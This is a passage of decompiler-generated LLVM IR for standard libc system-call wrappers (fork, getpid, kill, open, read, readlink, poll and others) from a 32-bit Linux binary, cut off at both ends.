  store i32 %v1_805a920, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a920, -4095
  br i1 %tmp, label %dec_label_pc_805a938, label %dec_label_pc_805a92c

dec_label_pc_805a92c:                             ; preds = %entry
  %v1_805a92c = call i32 @__errno_location(i32 %v0_805a918)
  %v0_805a931 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a931 = sub i32 0, %v0_805a931
  %v2_805a933 = inttoptr i32 %v1_805a92c to i32*
  store i32 %v1_805a931, i32* %v2_805a933, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a938

dec_label_pc_805a938:                             ; preds = %entry, %dec_label_pc_805a92c
  %v0_805a939 = phi i32 [ %v1_805a920, %entry ], [ -1, %dec_label_pc_805a92c ]
  %v2_805a93c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a93c, i32* @edi, align 4
  ret i32 %v0_805a939

; uselistorder directives
  uselistorder i32 %v1_805a920, { 1, 0, 2 }
  uselistorder i32 %v0_805a918, { 1, 0, 2 }
  uselistorder i32 (i32)* @close, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a938, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a940 = load i32, i32* @ebx, align 4
  store i32 %v0_805a940, i32* %stack_var_-4, align 4
  %v1_805a949 = call i32 @fork(i32 %v0_805a940)
  store i32 %v1_805a949, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a949, -4095
  br i1 %tmp, label %dec_label_pc_805a960, label %dec_label_pc_805a954

dec_label_pc_805a954:                             ; preds = %entry
  %v0_805a954 = load i32, i32* %stack_var_-4, align 4
  %v1_805a954 = call i32 @__errno_location(i32 %v0_805a954)
  %v0_805a959 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a959 = sub i32 0, %v0_805a959
  %v2_805a95b = inttoptr i32 %v1_805a954 to i32*
  store i32 %v1_805a959, i32* %v2_805a95b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a960

dec_label_pc_805a960:                             ; preds = %entry, %dec_label_pc_805a954
  %v0_805a961 = phi i32 [ %v1_805a949, %entry ], [ -1, %dec_label_pc_805a954 ]
  %v2_805a964 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a964, i32* @ebx, align 4
  ret i32 %v0_805a961

; uselistorder directives
  uselistorder i32 %v1_805a949, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_805a960, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805a99b = ptrtoint i32* %stack_var_-8 to i32
  %v2_805a9a2 = call i32 @getrlimit(i32 7, i32 %v2_805a99b)
  %v2_805a9af = icmp slt i32 %v2_805a9a2, 0
  br i1 %v2_805a9af, label %dec_label_pc_805a9b7, label %dec_label_pc_805a9b3

dec_label_pc_805a9b3:                             ; preds = %entry
  %v3_805a9b3 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805a9b7

dec_label_pc_805a9b7:                             ; preds = %entry, %dec_label_pc_805a9b3
  %v0_805a9b7 = phi i32 [ 256, %entry ], [ %v3_805a9b3, %dec_label_pc_805a9b3 ]
  ret i32 %v0_805a9b7

; uselistorder directives
  uselistorder label %dec_label_pc_805a9b7, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805a9e8 = load i32, i32* @global_var_807d8d0.636, align 16
  %v1_805a9f3 = icmp eq i32 %v0_805a9e8, 0
  %v1_805a9f5 = icmp eq i1 %v1_805a9f3, false
  %v4_805a9f5 = select i1 %v1_805a9f5, i32 %v0_805a9e8, i32 4096
  ret i32 %v4_805a9f5
}

define i32 @__libc_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a9fc = load i32, i32* @ebx, align 4
  store i32 %v0_805a9fc, i32* %stack_var_-4, align 4
  %v1_805aa05 = call i32 @getpid(i32 %v0_805a9fc)
  store i32 %v1_805aa05, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805aa05, -4095
  br i1 %tmp, label %dec_label_pc_805aa1c, label %dec_label_pc_805aa10

dec_label_pc_805aa10:                             ; preds = %entry
  %v0_805aa10 = load i32, i32* %stack_var_-4, align 4
  %v1_805aa10 = call i32 @__errno_location(i32 %v0_805aa10)
  %v0_805aa15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805aa15 = sub i32 0, %v0_805aa15
  %v2_805aa17 = inttoptr i32 %v1_805aa10 to i32*
  store i32 %v1_805aa15, i32* %v2_805aa17, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805aa1c

dec_label_pc_805aa1c:                             ; preds = %entry, %dec_label_pc_805aa10
  %v0_805aa1d = phi i32 [ %v1_805aa05, %entry ], [ -1, %dec_label_pc_805aa10 ]
  %v2_805aa20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aa20, i32* @ebx, align 4
  ret i32 %v0_805aa1d

; uselistorder directives
  uselistorder i32 %v1_805aa05, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805aa1c, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805aa24 = load i32, i32* @ebx, align 4
  store i32 %v0_805aa24, i32* %stack_var_-4, align 4
  %v1_805aa2d = call i32 @getppid(i32 %v0_805aa24)
  store i32 %v1_805aa2d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805aa2d, -4095
  br i1 %tmp, label %dec_label_pc_805aa44, label %dec_label_pc_805aa38

dec_label_pc_805aa38:                             ; preds = %entry
  %v0_805aa38 = load i32, i32* %stack_var_-4, align 4
  %v1_805aa38 = call i32 @__errno_location(i32 %v0_805aa38)
  %v0_805aa3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805aa3d = sub i32 0, %v0_805aa3d
  %v2_805aa3f = inttoptr i32 %v1_805aa38 to i32*
  store i32 %v1_805aa3d, i32* %v2_805aa3f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805aa44

dec_label_pc_805aa44:                             ; preds = %entry, %dec_label_pc_805aa38
  %v0_805aa45 = phi i32 [ %v1_805aa2d, %entry ], [ -1, %dec_label_pc_805aa38 ]
  %v2_805aa48 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aa48, i32* @ebx, align 4
  ret i32 %v0_805aa45

; uselistorder directives
  uselistorder i32 %v1_805aa2d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_805aa44, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805aa4c = load i32, i32* @ebx, align 4
  store i32 %v0_805aa4c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805aa5f = call i32 @int80_syscall(i32 191)
  store i32 %v1_805aa5f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805aa5f, -4095
  br i1 %tmp, label %dec_label_pc_805aa78, label %dec_label_pc_805aa6c

dec_label_pc_805aa6c:                             ; preds = %entry
  %v0_805aa6c = load i32, i32* %stack_var_-4, align 4
  %v1_805aa6c = call i32 @__errno_location(i32 %v0_805aa6c)
  %v0_805aa71 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805aa71 = sub i32 0, %v0_805aa71
  %v2_805aa73 = inttoptr i32 %v1_805aa6c to i32*
  store i32 %v1_805aa71, i32* %v2_805aa73, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805aa78

dec_label_pc_805aa78:                             ; preds = %entry, %dec_label_pc_805aa6c
  %v0_805aa79 = phi i32 [ %v1_805aa5f, %entry ], [ -1, %dec_label_pc_805aa6c ]
  %v2_805aa7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aa7c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805aa79

; uselistorder directives
  uselistorder i32 %v1_805aa5f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805aa78, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805aa80 = load i32, i32* @ebx, align 4
  store i32 %v0_805aa80, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805aa93 = call i32 @gettimeofday(i32 %v0_805aa80, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805aa93, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805aa93, -4095
  br i1 %tmp, label %dec_label_pc_805aaac, label %dec_label_pc_805aaa0

dec_label_pc_805aaa0:                             ; preds = %entry
  %v0_805aaa0 = load i32, i32* %stack_var_-4, align 4
  %v1_805aaa0 = call i32 @__errno_location(i32 %v0_805aaa0)
  %v0_805aaa5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805aaa5 = sub i32 0, %v0_805aaa5
  %v2_805aaa7 = inttoptr i32 %v1_805aaa0 to i32*
  store i32 %v1_805aaa5, i32* %v2_805aaa7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805aaac

dec_label_pc_805aaac:                             ; preds = %entry, %dec_label_pc_805aaa0
  %v0_805aaad = phi i32 [ %v4_805aa93, %entry ], [ -1, %dec_label_pc_805aaa0 ]
  %v2_805aab0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aab0, i32* @ebx, align 4
  ret i32 %v0_805aaad

; uselistorder directives
  uselistorder i32 %v4_805aa93, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805aaac, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805aab4 = load i32, i32* @edi, align 4
  store i32 %v0_805aab4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805aacc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805aad4 = call i32 @ioctl(i32 %v0_805aacc, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805aacc, i32* @ebx, align 4
  store i32 %v3_805aad4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805aad4, -4095
  br i1 %tmp, label %dec_label_pc_805aaec, label %dec_label_pc_805aae0

dec_label_pc_805aae0:                             ; preds = %entry
  %v1_805aae0 = call i32 @__errno_location(i32 %v0_805aacc)
  %v0_805aae5 = load i32, i32* %edi.global-to-local, align 4
  %v1_805aae5 = sub i32 0, %v0_805aae5
  %v2_805aae7 = inttoptr i32 %v1_805aae0 to i32*
  store i32 %v1_805aae5, i32* %v2_805aae7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805aaec

dec_label_pc_805aaec:                             ; preds = %entry, %dec_label_pc_805aae0
  %v0_805aaef = phi i32 [ %v3_805aad4, %entry ], [ -1, %dec_label_pc_805aae0 ]
  %v2_805aaf1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aaf1, i32* @edi, align 4
  ret i32 %v0_805aaef

; uselistorder directives
  uselistorder i32 %v3_805aad4, { 1, 0, 2 }
  uselistorder i32 %v0_805aacc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805aaec, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805aaf4 = load i32, i32* @ebx, align 4
  store i32 %v0_805aaf4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805ab07 = call i32 @kill(i32 %v0_805aaf4, i32 %tmp4)
  store i32 %v2_805ab07, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805ab07, -4095
  br i1 %tmp, label %dec_label_pc_805ab20, label %dec_label_pc_805ab14

dec_label_pc_805ab14:                             ; preds = %entry
  %v0_805ab14 = load i32, i32* %stack_var_-4, align 4
  %v1_805ab14 = call i32 @__errno_location(i32 %v0_805ab14)
  %v0_805ab19 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ab19 = sub i32 0, %v0_805ab19
  %v2_805ab1b = inttoptr i32 %v1_805ab14 to i32*
  store i32 %v1_805ab19, i32* %v2_805ab1b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ab20

dec_label_pc_805ab20:                             ; preds = %entry, %dec_label_pc_805ab14
  %v0_805ab21 = phi i32 [ %v2_805ab07, %entry ], [ -1, %dec_label_pc_805ab14 ]
  %v2_805ab20 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ab20, i32* @edx, align 4
  %v2_805ab24 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ab24, i32* @ebx, align 4
  ret i32 %v0_805ab21

; uselistorder directives
  uselistorder i32 %v2_805ab07, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @kill, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805ab20, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805ab2a = load i32, i32* @ebx, align 4
  store i32 %v0_805ab2a, i32* %stack_var_-12, align 4
  %v2_805ab32 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805ab32, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_805ab4c = call i32 @int80_syscall(i32 140)
  store i32 %v1_805ab4c, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_805ab4c, -4095
  br i1 %tmp16, label %dec_label_pc_805ab66, label %dec_label_pc_805ab58

dec_label_pc_805ab58:                             ; preds = %entry
  %v1_805ab58 = call i32 @__errno_location(i32 %arg3)
  %v0_805ab5d = load i32, i32* %esi.global-to-local, align 4
  %v1_805ab5d = sub i32 0, %v0_805ab5d
  %v2_805ab5f = inttoptr i32 %v1_805ab58 to i32*
  store i32 %v1_805ab5d, i32* %v2_805ab5f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805ab6a

dec_label_pc_805ab66:                             ; preds = %entry
  %v1_805ab66 = icmp eq i32 %v1_805ab4c, 0
  br i1 %v1_805ab66, label %dec_label_pc_805ab6f, label %dec_label_pc_805ab6a

dec_label_pc_805ab6a:                             ; preds = %dec_label_pc_805ab66, %dec_label_pc_805ab58
  %v0_805ab6a = phi i32 [ %v1_805ab4c, %dec_label_pc_805ab66 ], [ -1, %dec_label_pc_805ab58 ]
  %v1_805ab6c = ashr i32 %v0_805ab6a, 31
  br label %dec_label_pc_805ab77

dec_label_pc_805ab6f:                             ; preds = %dec_label_pc_805ab66
  %v3_805ab6f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805ab77

dec_label_pc_805ab77:                             ; preds = %dec_label_pc_805ab6a, %dec_label_pc_805ab6f
  %v0_805ab7d = phi i32 [ %v0_805ab6a, %dec_label_pc_805ab6a ], [ %v3_805ab6f, %dec_label_pc_805ab6f ]
  %storemerge = phi i32 [ %v1_805ab6c, %dec_label_pc_805ab6a ], [ %tmp, %dec_label_pc_805ab6f ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_805ab7a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ab7a, i32* @ebx, align 4
  ret i32 %v0_805ab7d

; uselistorder directives
  uselistorder i32 %v1_805ab4c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805ab77, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805ac5c = load i32, i32* @ebx, align 4
  store i32 %v0_805ac5c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805ac6f = call i32 @munmap(i32 %v0_805ac5c, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805ac6f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805ac6f, -4095
  br i1 %tmp, label %dec_label_pc_805ac88, label %dec_label_pc_805ac7c

dec_label_pc_805ac7c:                             ; preds = %entry
  %v0_805ac7c = load i32, i32* %stack_var_-4, align 4
  %v1_805ac7c = call i32 @__errno_location(i32 %v0_805ac7c)
  %v0_805ac81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ac81 = sub i32 0, %v0_805ac81
  %v2_805ac83 = inttoptr i32 %v1_805ac7c to i32*
  store i32 %v1_805ac81, i32* %v2_805ac83, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ac88

dec_label_pc_805ac88:                             ; preds = %entry, %dec_label_pc_805ac7c
  %v0_805ac89 = phi i32 [ %v4_805ac6f, %entry ], [ -1, %dec_label_pc_805ac7c ]
  %v2_805ac8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ac8c, i32* @ebx, align 4
  ret i32 %v0_805ac89

; uselistorder directives
  uselistorder i32 %v4_805ac6f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805ac88, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805ac90 = load i32, i32* @ebx, align 4
  store i32 %v0_805ac90, i32* %stack_var_-4, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805aca3 = call i32 @nanosleep(i32 %v0_805ac90, i32 %tmp4)
  store i32 %v2_805aca3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805aca3, -4095
  br i1 %tmp, label %dec_label_pc_805acbc, label %dec_label_pc_805acb0

dec_label_pc_805acb0:                             ; preds = %entry
  %v0_805acb0 = load i32, i32* %stack_var_-4, align 4
  %v1_805acb0 = call i32 @__errno_location(i32 %v0_805acb0)
  %v0_805acb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805acb5 = sub i32 0, %v0_805acb5
  %v2_805acb7 = inttoptr i32 %v1_805acb0 to i32*
  store i32 %v1_805acb5, i32* %v2_805acb7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805acbc

dec_label_pc_805acbc:                             ; preds = %entry, %dec_label_pc_805acb0
  %v0_805acbd = phi i32 [ %v2_805aca3, %entry ], [ -1, %dec_label_pc_805acb0 ]
  %v2_805acc0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805acc0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805acbd

; uselistorder directives
  uselistorder i32 %v2_805aca3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805acbc, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v0_805acc4 = load i32, i32* @edi, align 4
  %v0_805acc7 = load i32, i32* @ebx, align 4
  %v4_805accb = sext i8 %arg2 to i32
  store i32 %v4_805accb, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_805acd3 = and i8 %arg2, 64
  %v3_805acd3 = icmp eq i8 %v2_805acd3, 0
  br i1 %v3_805acd3, label %dec_label_pc_805ace4, label %dec_label_pc_805acd8

dec_label_pc_805acd8:                             ; preds = %entry
  br label %dec_label_pc_805ace4

dec_label_pc_805ace4:                             ; preds = %entry, %dec_label_pc_805acd8
  store i32 %arg1, i32* @ebx, align 4
  %v2_805acef = call i32 @open(i32 %v0_805acc7, i32 %tmp11)
  store i32 %v2_805acef, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805acef, -4095
  br i1 %tmp, label %dec_label_pc_805ad07, label %dec_label_pc_805acfb

dec_label_pc_805acfb:                             ; preds = %dec_label_pc_805ace4
  %v1_805acfb = call i32 @__errno_location(i32 %v0_805acc7)
  %v0_805ad00 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ad00 = sub i32 0, %v0_805ad00
  %v2_805ad02 = inttoptr i32 %v1_805acfb to i32*
  store i32 %v1_805ad00, i32* %v2_805ad02, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ad07

dec_label_pc_805ad07:                             ; preds = %dec_label_pc_805ace4, %dec_label_pc_805acfb
  %v0_805ad0a = phi i32 [ %v2_805acef, %dec_label_pc_805ace4 ], [ -1, %dec_label_pc_805acfb ]
  store i32 %v0_805acc7, i32* @ebx, align 4
  store i32 %v0_805acc4, i32* @edi, align 4
  ret i32 %v0_805ad0a

; uselistorder directives
  uselistorder i32 %v2_805acef, { 1, 0, 2 }
  uselistorder i32 %v0_805acc7, { 1, 0, 2 }
  uselistorder i8 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805ad07, { 1, 0 }
  uselistorder label %dec_label_pc_805ace4, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805adb0 = load i32, i32* @edi, align 4
  store i32 %v0_805adb0, i32* %stack_var_-4, align 4
  %v4_805adb4 = ptrtoint %pollfd* %arg1 to i32
  store i32 %v4_805adb4, i32* %edi.global-to-local, align 4
  %v0_805adc0 = load i32, i32* @ebx, align 4
  %v5_805adc8 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805adc0, i32* @ebx, align 4
  store i32 %v5_805adc8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_805adc8, -4095
  br i1 %tmp, label %dec_label_pc_805ade0, label %dec_label_pc_805add4

dec_label_pc_805add4:                             ; preds = %entry
  %v1_805add4 = call i32 @__errno_location(i32 %v0_805adc0)
  %v0_805add9 = load i32, i32* %edi.global-to-local, align 4
  %v1_805add9 = sub i32 0, %v0_805add9
  %v2_805addb = inttoptr i32 %v1_805add4 to i32*
  store i32 %v1_805add9, i32* %v2_805addb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805ade0

dec_label_pc_805ade0:                             ; preds = %entry, %dec_label_pc_805add4
  %v0_805ade1 = phi i32 [ %v5_805adc8, %entry ], [ -1, %dec_label_pc_805add4 ]
  %v2_805ade4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ade4, i32* @edi, align 4
  ret i32 %v0_805ade1

; uselistorder directives
  uselistorder i32 %v5_805adc8, { 1, 0, 2 }
  uselistorder i32 %v0_805adc0, { 1, 0 }
  uselistorder label %dec_label_pc_805ade0, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805afd8 = load i32, i32* @edi, align 4
  store i32 %v0_805afd8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805afe8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805aff0 = call i32 @read(i32 %v0_805afe8, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805afe8, i32* @ebx, align 4
  store i32 %v3_805aff0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805aff0, -4095
  br i1 %tmp, label %dec_label_pc_805b008, label %dec_label_pc_805affc

dec_label_pc_805affc:                             ; preds = %entry
  %v1_805affc = call i32 @__errno_location(i32 %v0_805afe8)
  %v0_805b001 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b001 = sub i32 0, %v0_805b001
  %v2_805b003 = inttoptr i32 %v1_805affc to i32*
  store i32 %v1_805b001, i32* %v2_805b003, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b008

dec_label_pc_805b008:                             ; preds = %entry, %dec_label_pc_805affc
  %v0_805b009 = phi i32 [ %v3_805aff0, %entry ], [ -1, %dec_label_pc_805affc ]
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805b00c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b00c, i32* @edi, align 4
  ret i32 %v0_805b009

; uselistorder directives
  uselistorder i32 %v3_805aff0, { 1, 0, 2 }
  uselistorder i32 %v0_805afe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b008, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b010 = load i32, i32* @edi, align 4
  store i32 %v0_805b010, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805b020 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805b028 = call i32 @readlink(i32 %v0_805b020, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805b020, i32* @ebx, align 4
  store i32 %v3_805b028, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b028, -4095
  br i1 %tmp, label %dec_label_pc_805b040, label %dec_label_pc_805b034

dec_label_pc_805b034:                             ; preds = %entry
  %v1_805b034 = call i32 @__errno_location(i32 %v0_805b020)
  %v0_805b039 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b039 = sub i32 0, %v0_805b039
  %v2_805b03b = inttoptr i32 %v1_805b034 to i32*
  store i32 %v1_805b039, i32* %v2_805b03b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b040

dec_label_pc_805b040:                             ; preds = %entry, %dec_label_pc_805b034
  %v0_805b041 = phi i32 [ %v3_805b028, %entry ], [ -1, %dec_label_pc_805b034 ]
  %v2_805b044 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b044, i32* @edi, align 4
  ret i32 %v0_805b041

; uselistorder directives
  uselistorder i32 %v3_805b028, { 1, 0, 2 }
  uselistorder i32 %v0_805b020, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 1, 0 }
  uselistorder label %dec_label_pc_805b040, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b144 = load i32, i32* @ebx, align 4
  store i32 %v0_805b144, i32* %stack_var_-4, align 4
  %v1_805b14d = call i32 @sched_yield(i32 %v0_805b144)
  store i32 %v1_805b14d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b14d, -4095
  br i1 %tmp, label %dec_label_pc_805b164, label %dec_label_pc_805b158

dec_label_pc_805b158:                             ; preds = %entry
  %v0_805b158 = load i32, i32* %stack_var_-4, align 4
  %v1_805b158 = call i32 @__errno_location(i32 %v0_805b158)
  %v0_805b15d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b15d = sub i32 0, %v0_805b15d
  %v2_805b15f = inttoptr i32 %v1_805b158 to i32*
  store i32 %v1_805b15d, i32* %v2_805b15f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b164

dec_label_pc_805b164:                             ; preds = %entry, %dec_label_pc_805b158
  %v0_805b165 = phi i32 [ %v1_805b14d, %entry ], [ -1, %dec_label_pc_805b158 ]
  %v2_805b168 = load i32, i32* %stack_var_-4, align 4
